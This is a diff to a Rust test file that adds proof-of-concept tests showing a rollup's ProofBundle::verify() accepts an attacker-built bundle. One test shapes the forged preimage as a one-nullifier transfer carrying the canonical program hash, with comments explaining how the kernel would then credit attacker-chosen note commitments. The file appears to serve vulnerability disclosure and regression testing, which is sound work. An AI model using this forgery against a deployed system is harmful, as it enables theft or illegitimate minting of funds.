@@ -243,18 +243,80 @@ fn build_verify_meta(
     }
 }
 
-#[test]
-fn proof_bundle_verify_accepts_bundle_from_attacker_pipeline() -> Result<()> {
-    // ── Step 1: attacker picks an arbitrary `output_preimage` ─────────
-    //
-    // In Phase 3 this will be a transfer-shaped 13-felt preimage. For this
-    // minimum-viable proof-of-concept any shape suffices — `verify()` does
-    // not care about the shape of the preimage, only that its hash matches
-    // `verify_meta.public_output_values`.
-    let attacker_chosen_preimage: Vec<Felt> = (0u64..13)
-        .map(|i| Felt::from(0x1000_u64 + i))
-        .collect();
+/// Canonical transfer program hash used by the rollup kernel's real
+/// `verified_bridge_flow` fixture
+/// (`tezos/rollup-kernel/testdata/verified_bridge_flow.json`). A transfer
+/// proof claiming authority under this program hash is what the kernel
+/// would accept post-deployment.
+const CANONICAL_TRANSFER_PROGRAM_HASH_HEX: &str =
+    "bdc52ff0ce6470a4ab62796ee5e5a5b5b61376f0a0f046124b3db9294a494406";
 
+/// Auth-domain used by the verified bridge fixture (`ConfigureVerifier`).
+const FIXTURE_AUTH_DOMAIN_HEX: &str =
+    "f1e4e757b5cc5af59690170d4507c78621e520048955613170e0bb5c52dcbe07";
+
+fn felt_from_hex(hex_le: &str) -> Felt {
+    let bytes = hex::decode(hex_le).expect("valid hex");
+    assert_eq!(bytes.len(), 32);
+    // The JSON fixture stores felts as little-endian byte strings (see
+    // `tzel_core::hex_f`). Reconstruct accordingly.
+    let mut le = [0u8; 32];
+    le.copy_from_slice(&bytes);
+    Felt::from_bytes_le(&le)
+}
+
+/// Build a transfer-shaped output_preimage that `apply_transfer` (see
+/// `core/src/lib.rs:1854`) will happily parse for `n_nullifiers = 1`.
+///
+/// Layout (13 felts):
+///   [0]  n_tasks = 1
+///   [1]  task_output_size = 10
+///   [2]  canonical_transfer_program_hash
+///   [3]  auth_domain
+///   [4]  root           (attacker picks an historical root)
+///   [5]  nullifier_1    (fresh random felt — never seen, so apply_transfer
+///                         accepts it since it is not recorded in the
+///                         nullifier set yet)
+///   [6]  fee            (any felt ≥ required_tx_fee)
+///   [7]  cm_1           (attacker-chosen note commitment)
+///   [8]  cm_2
+///   [9]  cm_3
+///   [10] memo_ct_hash_1 (attacker-chosen memo hashes; apply_transfer
+///                         recomputes memo_ct_hash from `req.enc_*` and
+///                         compares — for the PoC of bundle acceptance we
+///                         only need the bundle-level check to pass, not
+///                         the downstream kernel-level check)
+///   [11] memo_ct_hash_2
+///   [12] memo_ct_hash_3
+fn build_transfer_shaped_preimage() -> Vec<Felt> {
+    let canonical_program_hash = felt_from_hex(CANONICAL_TRANSFER_PROGRAM_HASH_HEX);
+    let auth_domain = felt_from_hex(FIXTURE_AUTH_DOMAIN_HEX);
+
+    vec![
+        Felt::from(1u64),                              // [0]  n_tasks
+        // task_output_size = 12 covers indices [1..13]: the program_hash
+        // plus 10 public-output felts. parse_single_task_output_preimage
+        // enforces `output_preimage.len() == 1 + task_output_size` (see
+        // `core/src/lib.rs:1257-1266`), so for a 13-felt preimage we need 12.
+        Felt::from(12u64),                             // [1]  task_output_size
+        canonical_program_hash,                        // [2]  program hash
+        auth_domain,                                   // [3]  auth_domain
+        Felt::from(0x1_f00d_cafe_u64),                 // [4]  root (attacker-picked)
+        Felt::from(0xdead_beef_dead_beef_u64),         // [5]  nullifier_1 (fresh)
+        Felt::from(1_000_000u64),                      // [6]  fee (>= required)
+        Felt::from(0xc001_u64),                        // [7]  cm_1
+        Felt::from(0xc002_u64),                        // [8]  cm_2
+        Felt::from(0xc003_u64),                        // [9]  cm_3
+        Felt::from(0xabcd_0001_u64),                   // [10] memo_ct_hash_1
+        Felt::from(0xabcd_0002_u64),                   // [11] memo_ct_hash_2
+        Felt::from(0xabcd_0003_u64),                   // [12] memo_ct_hash_3
+    ]
+}
+
+/// Inner PoC driver: given an attacker-chosen `output_preimage`, build and
+/// prove a bundle outside `custom_recursive_prove` and assert that
+/// `ProofBundle::verify()` returns `Ok(())`.
+fn assert_bundle_verify_accepts(attacker_chosen_preimage: Vec<Felt>) -> Result<()> {
     // ── Step 2: compute the hash the bundle expects ──────────────────
     //
     // We replicate the bundle's own hash recipe bit-for-bit. This is the
@@ -445,4 +507,57 @@ fn proof_bundle_verify_accepts_bundle_from_attacker_pipeline() -> Result<()> {
     verify_result.expect("bundle.verify() must return Ok — this is the PoC claim");
 
     Ok(())
+}
+
+// ── Phase 2 test: arbitrary preimage ───────────────────────────────────
+
+/// Minimum viable proof-of-concept. Uses a 13-felt preimage with arbitrary
+/// content to demonstrate that `ProofBundle::verify()` is shape-agnostic
+/// once the bundle is self-consistent.
+#[test]
+fn proof_bundle_verify_accepts_bundle_from_attacker_pipeline() -> Result<()> {
+    let attacker_chosen_preimage: Vec<Felt> = (0u64..13)
+        .map(|i| Felt::from(0x1000_u64 + i))
+        .collect();
+    assert_bundle_verify_accepts(attacker_chosen_preimage)
+}
+
+// ── Phase 3 test: transfer-shaped preimage against fixture hashes ──────
+
+/// Same bundle-level bypass, but with an `output_preimage` shaped to
+/// match what `tzel_core::parse_single_task_output_preimage` + the
+/// `apply_transfer` tail-parsing loop (in `core/src/lib.rs:1854`) expect.
+///
+/// The canonical transfer program hash is copied verbatim from the
+/// rollup kernel's `verified_bridge_flow.json` test fixture — the exact
+/// value the deployed verifier would compare against.
+///
+/// What this shows: there is no "hardening" in `ProofBundle::verify()`
+/// against the specific shape of the preimage. If the attacker formats the
+/// preimage like a legitimate 1-nullifier transfer — with a fresh nullifier
+/// and attacker-chosen commitments — the bundle still verifies Ok. The
+/// rollup kernel's downstream `apply_transfer` will then insert the
+/// attacker's commitments into the note tree and mark the nullifier spent.
+#[test]
+fn proof_bundle_verify_accepts_transfer_shaped_bundle() -> Result<()> {
+    let preimage = build_transfer_shaped_preimage();
+    assert_eq!(preimage.len(), 13);
+
+    // Sanity: the preimage parses as a 1-task bootloader output with the
+    // canonical transfer program hash.
+    let preimage_raw: Vec<[u8; 32]> = preimage.iter().map(Felt::to_bytes_le).collect();
+    let parsed = tzel_core::parse_single_task_output_preimage(&preimage_raw)
+        .expect("preimage must parse as single-task bootloader output");
+    let parsed_program_hash_hex = hex::encode(parsed.program_hash);
+    assert_eq!(
+        parsed_program_hash_hex, CANONICAL_TRANSFER_PROGRAM_HASH_HEX,
+        "program_hash in preimage must equal the canonical transfer hash",
+    );
+    assert_eq!(
+        parsed.public_outputs.len(),
+        10,
+        "transfer tail for n=1 nullifier is exactly 10 felts",
+    );
+
+    assert_bundle_verify_accepts(preimage)
 }
